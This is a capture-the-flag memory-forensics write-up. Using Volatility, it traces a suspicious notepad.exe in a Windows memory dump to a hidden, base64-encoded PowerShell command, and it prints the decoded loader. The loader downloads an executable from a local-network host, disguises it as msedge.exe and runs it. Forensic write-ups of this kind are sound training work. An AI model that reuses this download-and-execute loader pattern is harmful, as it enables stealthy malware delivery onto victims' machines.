---
created: 2024-06-22T18:02
updated: 2024-06-22T18:13
---

# analysis

`vol.py -f chal_mem_search.DUMP windows.info`

Yup, its a windows memdump.

`vol.py -f chal_mem_search.DUMP windows.pstree.PsTree`

`notepad.exe` seems most suspicious.

```
*** 5456:  100.03576    notepad.exe     0xcd88ce2ed340  5       -       1       False   2024-05-11 09:33:19.000000      N/A     \Device\HarddiskVolume3\Windows\System32\notepad.exe    -       -
```

`vol.py -f chal_mem_search.DUMP windows.memmap --pid 5456 --dump`

The memory of notepad has been dumped, let's examine it.

## notepad.exe strings sorted

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1719093853/2024/06/55cfcdfba30fb91f652a46b49fd3cc66.png)

Sorting the strings from longest to shortest to avoid distraction.

We soon come across this command, that calls powershell.

```sh
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -window hidden -noni -enc JAB1AD0AJwBoAHQAJwArACcAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAwAC4AMQA2ADoAOAAyADgAMgAvAEIANgA0AF8AZABlAGMAJwArACcAbwBkAGUAXwBSAGsAeABCAFIAMwB0AEUAWQBYAGwAMQBiAFYAOQAwAGEARwBsAHoAWAAnACsAJwAyAGwAegBYADMATgBsAFkAMwBKAGwAZABGADkAbQBhAFcAeABsAGYAUQAlADMAJwArACcARAAlADMARAAvAGMAaABhAGwAbABfAG0AZQBtAF8AcwBlACcAKwAnAGEAcgBjAGgALgBlACcAKwAnAHgAZQAnADsAJAB0AD0AJwBXAGEAbgAnACsAJwBpAFQAZQBtACcAKwAnAHAAJwA7AG0AawBkAGkAcgAgAC0AZgBvAHIAYwBlACAAJABlAG4AdgA6AFQATQBQAFwALgAuAFwAJAB0ADsAdAByAHkAewBpAHcAcgAgACQAdQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZABcAG0AcwBlAGQAZwBlAC4AZQB4AGUAOwAmACAAJABkAFwAbQBzAGUAZABnAGUALgBlAHgAZQA7AH0AYwBhAHQAYwBoAHsAfQA=
```

Very suspicious... The base64 decodes to UTF16LE charset. And it's a powershell file with very suspicious obfuscation, with the mention of `Wani`, nice.

```powershell
$u='ht'+'tp://192.168.0.16:8282/B64_dec'+'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3D/chall_mem_se'+'arch.e'+'xe';$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{}
```

Clean up.

```powershell
$u='http://192.168.0.16:8282/B64_decode_RkxBR3tEYXl1bV90aGlzX2lzX3NlY3JldF9maWxlfQ%3D%3D/chall_mem_search.exe';
$t='WaniTemp';
mkdir -force $env:TMP\..\$t;
try{
iwr $u -OutFile $d\msedge.exe;
& $d\msedge.exe;
}catch{
}
```

Another base64!

```
FLAG{Dayum_this_is_secret_file}
```
